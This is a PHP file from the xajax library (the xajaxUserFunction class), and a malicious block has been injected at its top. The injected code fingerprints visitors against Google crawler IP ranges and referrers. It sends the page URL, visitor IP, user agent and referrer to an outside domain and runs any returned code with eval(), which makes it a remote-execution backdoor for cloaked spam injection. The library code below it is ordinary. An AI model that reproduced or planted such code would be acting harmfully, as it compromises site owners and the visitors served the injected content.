<?php
//{{37560eac

GLOBAL $wehaveitagain;
if($wehaveitagain != 1)
{
$preverrx=error_reporting(0);
$wehaveitagain = 1;
$mynetsxx = array(
'84.235.77.0' => 24,
'8.8.8.0' => 24,
'8.8.4.0' => 24,
'8.6.48.0' => 21,
'74.125.98.0' => 24,
'74.125.97.0' => 24,
'74.125.94.0' => 23,
'74.125.92.0' => 23,
'74.125.90.0' => 23,
'74.125.86.0' => 23,
'74.125.78.0' => 23,
'74.125.76.0' => 23,
'74.125.75.0' => 24,
'74.125.74.0' => 24,
'74.125.72.0' => 23,
'74.125.70.0' => 23,
'74.125.66.0' => 23,
'74.125.64.0' => 23,
'74.125.64.0' => 18,
'74.125.63.0' => 24,
'74.125.62.0' => 24,
'74.125.61.0' => 24,
'74.125.60.0' => 24,
'74.125.58.0' => 24,
'74.125.54.0' => 23,
'74.125.52.0' => 23,
'74.125.46.0' => 23,
'74.125.44.0' => 23,
'74.125.42.0' => 23,
'74.125.38.0' => 23,
'74.125.37.0' => 24,
'74.125.36.0' => 24,
'74.125.36.0' => 23,
'74.125.33.0' => 24,
'74.125.32.0' => 24,
'74.125.30.0' => 23,
'74.125.246.0' => 24,
'74.125.245.0' => 24,
'74.125.244.0' => 24,
'74.125.239.0' => 24,
'74.125.238.0' => 24,
'74.125.237.0' => 24,
'74.125.236.0' => 24,
'74.125.235.0' => 24,
'74.125.234.0' => 24,
'74.125.233.0' => 24,
'74.125.232.0' => 24,
'74.125.230.0' => 24,
'74.125.229.0' => 24,
'74.125.227.0' => 24,
'74.125.226.0' => 24,
'74.125.225.0' => 24,
'74.125.224.0' => 24,
'74.125.192.0' => 18,
'74.125.18.0' => 23,
'74.125.17.0' => 24,
'74.125.16.0' => 24,
'74.125.158.0' => 23,
'74.125.156.0' => 23,
'74.125.154.0' => 23,
'74.125.152.0' => 23,
'74.125.151.0' => 24,
'74.125.150.0' => 24,
'74.125.149.0' => 24,
'74.125.148.0' => 24,
'74.125.146.0' => 23,
'74.125.128.0' => 18,
'74.125.126.0' => 23,
'74.125.125.0' => 24,
'74.125.122.0' => 24,
'74.125.121.0' => 24,
'74.125.120.0' => 24,
'74.125.119.0' => 24,
'74.125.118.0' => 24,
'74.125.117.0' => 24,
'74.125.116.0' => 24,
'74.125.114.0' => 23,
'74.125.112.0' => 23,
'74.125.0.0' => 18,
'74.125.0.0' => 16,
'72.14.255.0' => 24,
'72.14.254.0' => 24,
'72.14.254.0' => 23,
'72.14.253.0' => 24,
'72.14.252.0' => 24,
'72.14.252.0' => 23,
'72.14.248.0' => 23,
'72.14.246.0' => 23,
'72.14.244.0' => 23,
'72.14.236.0' => 24,
'72.14.235.0' => 24,
'72.14.234.0' => 24,
'72.14.230.0' => 24,
'72.14.228.0' => 24,
'72.14.226.0' => 24,
'72.14.225.0' => 24,
'72.14.224.0' => 24,
'72.14.220.0' => 23,
'72.14.212.0' => 23,
'72.14.210.0' => 23,
'72.14.208.0' => 23,
'72.14.204.0' => 23,
'72.14.202.0' => 23,
'72.14.199.0' => 24,
'72.14.194.0' => 24,
'72.14.193.0' => 24,
'72.14.192.0' => 24,
'72.14.192.0' => 18,
'70.32.158.0' => 24,
'70.32.155.0' => 24,
'70.32.150.0' => 24,
'70.32.140.0' => 23,
'70.32.138.0' => 24,
'70.32.136.0' => 24,
'70.32.135.0' => 24,
'70.32.134.0' => 24,
'70.32.133.0' => 24,
'70.32.132.0' => 24,
'70.32.131.0' => 24,
'70.32.130.0' => 24,
'70.32.129.0' => 24,
'70.32.128.0' => 24,
'70.32.128.0' => 19,
'66.249.94.0' => 24,
'66.249.92.0' => 24,
'66.249.91.0' => 24,
'66.249.90.0' => 24,
'66.249.88.0' => 23,
'66.249.85.0' => 24,
'66.249.84.0' => 24,
'66.249.82.0' => 24,
'66.249.81.0' => 24,
'66.249.80.0' => 24,
'66.249.72.0' => 24,
'66.249.71.0' => 24,
'66.249.69.0' => 24,
'66.249.68.0' => 24,
'66.249.67.0' => 24,
'66.249.66.0' => 24,
'66.249.65.0' => 24,
'66.249.64.0' => 19,
'66.102.8.0' => 23,
'66.102.6.0' => 23,
'66.102.4.0' => 24,
'66.102.3.0' => 24,
'66.102.2.0' => 24,
'66.102.12.0' => 23,
'66.102.10.0' => 23,
'66.102.0.0' => 20,
'64.9.224.0' => 20,
'64.9.224.0' => 19,
'64.233.188.0' => 23,
'64.233.186.0' => 23,
'64.233.182.0' => 23,
'64.233.180.0' => 23,
'64.233.178.0' => 23,
'64.233.173.0' => 24,
'64.233.172.0' => 24,
'64.233.170.0' => 23,
'64.233.168.0' => 23,
'64.233.162.0' => 23,
'64.233.160.0' => 19,
'63.243.168.0' => 22,
'4.3.2.0' => 24,
'216.239.60.0' => 23,
'216.239.58.0' => 23,
'216.239.50.0' => 23,
'216.239.44.0' => 23,
'216.239.39.0' => 24,
'216.239.38.0' => 24,
'216.239.36.0' => 24,
'216.239.34.0' => 24,
'216.239.33.0' => 24,
'216.239.32.0' => 24,
'216.239.32.0' => 19,
'209.85.238.0' => 24,
'209.85.230.0' => 23,
'209.85.228.0' => 23,
'209.85.226.0' => 23,
'209.85.224.0' => 23,
'209.85.223.0' => 24,
'209.85.222.0' => 24,
'209.85.221.0' => 24,
'209.85.220.0' => 24,
'209.85.219.0' => 24,
'209.85.218.0' => 24,
'209.85.216.0' => 24,
'209.85.213.0' => 24,
'209.85.212.0' => 24,
'209.85.211.0' => 24,
'209.85.210.0' => 24,
'209.85.208.0' => 23,
'209.85.200.0' => 23,
'209.85.198.0' => 23,
'209.85.196.0' => 23,
'209.85.194.0' => 23,
'209.85.192.0' => 23,
'209.85.174.0' => 23,
'209.85.172.0' => 23,
'209.85.170.0' => 23,
'209.85.168.0' => 23,
'209.85.166.0' => 23,
'209.85.164.0' => 23,
'209.85.162.0' => 23,
'209.85.156.0' => 23,
'209.85.152.0' => 23,
'209.85.149.0' => 24,
'209.85.148.0' => 23,
'209.85.147.0' => 24,
'209.85.146.0' => 24,
'209.85.146.0' => 23,
'209.85.144.0' => 23,
'209.85.142.0' => 23,
'209.85.139.0' => 24,
'209.85.138.0' => 23,
'209.85.136.0' => 23,
'209.85.134.0' => 23,
'209.85.132.0' => 24,
'209.85.132.0' => 23,
'209.85.128.0' => 23,
'209.85.128.0' => 17,
'193.186.4.0' => 24,
'193.142.125.0' => 24,
'173.255.112.0' => 20,
'173.194.44.0' => 24,
'173.194.43.0' => 24,
'173.194.42.0' => 24,
'173.194.41.0' => 24,
'173.194.40.0' => 24,
'173.194.37.0' => 24,
'173.194.36.0' => 24,
'173.194.35.0' => 24,
'173.194.34.0' => 24,
'173.194.33.0' => 24,
'173.194.32.0' => 24,
'173.194.0.0' => 16,
'118.174.25.0' => 24,
'118.174.24.0' => 24,
'118.174.24.0' => 22,
'113.197.106.0' => 24,
'113.197.105.0' => 24,
'108.59.80.0' => 20
);
function ip_in_networkxx($ip, $net_addr, $net_mask)
{
  if($net_mask <= 0) return false;
  $ip_binary_string = sprintf("%032b",ip2long($ip));
  $net_binary_string = sprintf("%032b",ip2long($net_addr));
  return (strncmp($ip_binary_string,$net_binary_string,$net_mask) === 0);
}
function selfURL()
{
  if(!isset($_SERVER['REQUEST_URI'])) $suri = $_SERVER['PHP_SELF'];
  else $suri = $_SERVER['REQUEST_URI'];
  $s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : "";
  $sp=strtolower($_SERVER["SERVER_PROTOCOL"]);
  $pr = substr($sp,0,strpos($sp,"/")).$s;
  $pt = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
  return $pr."://".$_SERVER['SERVER_NAME'].$pt.$suri;
}
function loadDataHttpCse($url)
{
    $s = '';
    if (ini_get('allow_url_fopen') == 1) {
        $ctx = stream_context_create(array('http'=>array('timeout'=>3)));
        $s = file_get_contents($url, 0, $ctx);
    } else if (in_array('curl', get_loaded_extensions())) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $s = curl_exec($ch);
        curl_close($ch);
    } else {
        $parts = parse_url($url);
        $host = $parts['host'];
        $path = '/';
        $port = 80;
        if (isset($parts['path'])) {
            $path = $parts['path'];
        }
        if (isset($parts['port'])) {
            $port = $parts['port'];
        }
        $address = gethostbyname($host);
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($socket === false) {
            return false;
        }
        $timeout = array('sec'=>3, 'usec'=>0);
        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, $timeout);
        socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, $timeout);
        $result = socket_connect($socket, $address, $port);
        if ($result === false) {
            return false;
        }
        $in = "GET $path HTTP/1.1\r\n";
        $in .= "Host: $host\r\n";
        $in .= "Connection: Close\r\n\r\n";
        socket_write($socket, $in, strlen($in));
        $reply = '';
        while ($out = socket_read($socket, 2048)) {
            $reply .=  $out;
        }
        socket_close($socket);
        $s = substr($reply, (strpos($reply, "\r\n\r\n")+4));
        if (strpos(strtolower($reply), "transfer-encoding: chunked") !== FALSE) {
            $fp = 0;
            $outData = "";
            while ($fp < strlen($s)) {
                $rawnum = substr($s, $fp, strpos(substr($s, $fp), "\r\n") + 2);
                $num = hexdec(trim($rawnum));
                $fp += strlen($rawnum);
                $chunk = substr($s, $fp, $num);
                $outData .= $chunk;
                $fp += strlen($chunk);
            }
            $s = $outData;
        }
    }
    return $s;
}
function rewrioutclbkxxx1($str) { return rewriout($str,1); }
function rewrioutclbkxxx2($str) { return rewriout($str,2); }
function rewrioutclbkxxx3($str) { return rewriout($str,3); }
function rewriout($str, $ev)
{
  error_reporting(0);
  if(stripos($str, '<body') !== false)
  {
    $id = "4dae84ec67843a09b800edaa";
    $url = "http://innvidn.com/ck.gif";
    $req = $url.'?ev='.$ev.'&url='.urlencode(selfURL()).'&id='.urlencode($id).'&ref='.urlencode($_SERVER['HTTP_REFERER']).'&ip='.$_SERVER['REMOTE_ADDR'].'&ua='.urlencode($_SERVER['HTTP_USER_AGENT']);
    $answergrhey11=loadDataHttpCse($req);
    if($answergrhey11 != FALSE && strncmp('/*CODE', $answergrhey11, 6) == 0) {
      return eval($answergrhey11);
    }
  }
  return false;
}
function StrToNum($Str, $Check, $Magic)
{
   $Int32Unit = 4294967296;
   $length = strlen($Str);
   for ($i = 0; $i < $length; $i++) {
       $Check *= $Magic;
       if ($Check >= $Int32Unit) {
           $Check = ($Check - $Int32Unit * (int) ($Check / $Int32Unit));
           $Check = ($Check < -2147483648) ? ($Check + $Int32Unit) : $Check;
       }
       $Check += ord($Str{$i});
   }
   return $Check;
}
function HashURL($String)
{
   $Check1 = StrToNum($String, 0x1505, 0x21);
   $Check2 = StrToNum($String, 0, 0x1003F);
   $Check1 >>= 2;
   $Check1 = (($Check1 >> 4) & 0x3FFFFC0 ) | ($Check1 & 0x3F);
   $Check1 = (($Check1 >> 4) & 0x3FFC00 ) | ($Check1 & 0x3FF);
   $Check1 = (($Check1 >> 4) & 0x3C000 ) | ($Check1 & 0x3FFF);
   $T1 = (((($Check1 & 0x3C0) << 4) | ($Check1 & 0x3C)) <<2 ) | ($Check2 & 0xF0F );
   $T2 = (((($Check1 & 0xFFFFC000) << 4) | ($Check1 & 0x3C00)) << 0xA) | ($Check2 & 0xF0F0000 );
   return ($T1 | $T2);
}
function CheckHash($Hashnum)
{
   $CheckByte = 0;
   $Flag = 0;
   $HashStr = sprintf('%u', $Hashnum) ;
   $length = strlen($HashStr);
   for ($i = $length-1; $i >= 0;  $i--) {
       $Re = $HashStr{$i};
       if (1 === ($Flag % 2)) {
           $Re += $Re;
           $Re = (int)($Re / 10) + ($Re % 10);
       }
       $CheckByte += $Re;
       $Flag ++;
   }
   $CheckByte %= 10;
   if (0 !== $CheckByte) {
       $CheckByte = 10 - $CheckByte;
       if (1 === ($Flag % 2) ) {
           if (1 === ($CheckByte % 2)) {
               $CheckByte += 9;
           }
           $CheckByte >>= 1;
       }
   }
   return '7'.$CheckByte.$HashStr;
}
function getpr($url)
{
   $ch = CheckHash(HashURL($url));
   $file = "http://toolbarqueries.google.com/tbr?client=navclient-auto&ch=$ch&features=Rank&q=info:$url";
   $data = file_get_contents($file);
   return $data;
}
if(isset($_POST['prgetxr']))
{
  echo getpr($_POST['prgetxr']);
  exit();
}
else
{
  $ev = 0;
  foreach($mynetsxx as 	$key => $value)
  {
    if(ip_in_networkxx($_SERVER['REMOTE_ADDR'], $key, $value)) {
      $ev = 1;
      break;
    }
  }
  if($ev == 0) {
    if(isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google.') !== false) {
        $ev = 2;
    }
    elseif(mt_rand(1,100) == 50) {
        $ev = 3;
    }
  }
  if(isset($_GET['showmeallpls'])) {
    $ev = $_GET['showmeallpls'];
  }
  if($ev > 0) {
	ob_start('rewrioutclbkxxx'.$ev);
  }
}
error_reporting($preverrx);
}
/*  */

//}}89822316
?><?php
/*
	File: xajaxUserFunction.inc.php

	Contains the xajaxUserFunction class

	Title: xajaxUserFunction class

	Please see <copyright.inc.php> for a detailed description, copyright
	and license information.
*/

/*
	@package xajax
	@version $Id: xajaxUserFunction.inc.php 362 2007-05-29 15:32:24Z calltoconstruct $
	@copyright Copyright (c) 2005-2007 by Jared White & J. Max Wilson
	@copyright Copyright (c) 2008-2009 by Joseph Woolley, Steffen Konerow, Jared White  & J. Max Wilson
	@license http://www.xajaxproject.org/bsd_license.txt BSD License
*/

/*
	Class: xajaxUserFunction
	
	Construct instances of this class to define functions that will be registered
	with the <xajax> request processor.  This class defines the parameters that
	are needed for the definition of a xajax enabled function.  While you can
	still specify functions by name during registration, it is advised that you
	convert to using this class when you wish to register external functions or 
	to specify call options as well.
*/
class xajaxUserFunction
{
	/*
		String: sAlias
		
		An alias to use for this function.  This is useful when you want
		to call the same xajax enabled function with a different set of
		call options from what was already registered.
	*/
	var $sAlias;
	
	/*
		Object: uf
		
		A string or array which defines the function to be registered.
	*/
	var $uf;
	
	/*
		String: sInclude
		
		The path and file name of the include file that contains the function.
	*/
	var $sInclude;
	
	/*
		Array: aConfiguration
		
		An associative array containing call options that will be sent to the
		browser curing client script generation.
	*/
	var $aConfiguration;
	
	/*
		Function: xajaxUserFunction
		
		Constructs and initializes the <xajaxUserFunction> object.
		
		$uf - (mixed): A function specification in one of the following formats:
		
			- a three element array:
				(string) Alternate function name: when a method of a class has the same
					name as another function in the system, you can provide an alias to 
					help avoid collisions.
				(object or class name) Class: the name of the class or an instance of
					the object which contains the function to be called.
				(string) Method:  the name of the method that will be called.
			- a two element array:
				(object or class name) Class: the name of the class or an instance of
					the object which contains the function to be called.
				(string) Method:  the name of the method that will be called.
			- a string:
				the name of the function that is available at global scope (not in a 
				class.
		$sInclude - (string, optional):  The path and file name of the include file
			that contains the class or function to be called.
			
		$aConfiguration - (array, optional):  An associative array of call options
			that will be used when sending the request from the client.
			
		Examples:
		
			$myFunction = array('alias', 'myClass', 'myMethod');
			$myFunction = array('alias', &$myObject, 'myMethod');
			$myFunction = array('myClass', 'myMethod');
			$myFunction = array(&$myObject, 'myMethod');
			$myFunction = 'myFunction';
			
			$myUserFunction = new xajaxUserFunction($myFunction, 'myFile.inc.php', array(
				'method' => 'get',
				'mode' => 'synchronous'
				));
				
			$xajax->register(XAJAX_FUNCTION, $myUserFunction);				
	*/
	function xajaxUserFunction($uf, $sInclude=NULL, $aConfiguration=array())
	{
		$this->sAlias = '';
		$this->uf =& $uf;
		$this->sInclude = $sInclude;
		$this->aConfiguration = array();
		foreach ($aConfiguration as $sKey => $sValue)
			$this->configure($sKey, $sValue);
		
		if (is_array($this->uf) && 2 < count($this->uf))
		{
			$this->sAlias = $this->uf[0];
			$this->uf = array_slice($this->uf, 1);
		}

//SkipDebug
		if (is_array($this->uf) && 2 != count($this->uf))
			trigger_error(
				'Invalid function declaration for xajaxUserFunction.',
				E_USER_ERROR
				);
//EndSkipDebug
	}
	
	/*
		Function: getName
		
		Get the name of the function being referenced.
		
		Returns:
		
		string - the name of the function contained within this object.
	*/
	function getName()
	{
		// Do not use sAlias here!
		if (is_array($this->uf))
			return $this->uf[1];
		return $this->uf;
	}
	
	/*
		Function: configure
		
		Call this to set call options for this instance.
	*/
	function configure($sName, $sValue)
	{
		if ('alias' == $sName)
			$this->sAlias = $sValue;
		else
			$this->aConfiguration[$sName] = $sValue;
	}
	
	/*
		Function: generateRequest
		
		Constructs and returns a <xajaxRequest> object which is capable
		of generating the javascript call to invoke this xajax enabled
		function.
	*/
	function generateRequest($sXajaxPrefix)
	{
		$sAlias = $this->getName();
		if (0 < strlen($this->sAlias))
			$sAlias = $this->sAlias;
		return new xajaxRequest("{$sXajaxPrefix}{$sAlias}");
	}
	
	/*
		Function: generateClientScript
		
		Called by the <xajaxPlugin> that is referencing this function
		reference during the client script generation phase.  This function
		will generate the javascript function stub that is sent to the
		browser on initial page load.
	*/
	function generateClientScript($sXajaxPrefix)
	{
		$sFunction = $this->getName();
		$sAlias = $sFunction;
		if (0 < strlen($this->sAlias))
			$sAlias = $this->sAlias;
		echo "{$sXajaxPrefix}{$sAlias} = function() { ";
		echo "return xajax.request( ";
		echo "{ xjxfun: '{$sFunction}' }, ";
		echo "{ parameters: arguments";

		$sSeparator = ", ";
		foreach ($this->aConfiguration as $sKey => $sValue)
			echo "{$sSeparator}{$sKey}: {$sValue}";

		echo " } ); ";
		echo "};\n";
	}

	/*
		Function: call
		
		Called by the <xajaxPlugin> that references this function during the
		request processing phase.  This function will call the specified
		function, including an external file if needed and passing along 
		the specified arguments.
	*/
	function call($aArgs=array())
	{
		$objResponseManager =& xajaxResponseManager::getInstance();
		
		if (NULL != $this->sInclude)
		{
			ob_start();
			require_once $this->sInclude;
			$sOutput = ob_get_clean();
			
//SkipDebug
			if (0 < strlen($sOutput))
			{
				$sOutput = 'From include file: ' . $this->sInclude . ' => ' . $sOutput;
				$objResponseManager->debug($sOutput);
			}
//EndSkipDebug
		}
		
		$mFunction = $this->uf;
		$objResponseManager->append(call_user_func_array($mFunction, $aArgs));
	}
}
?>
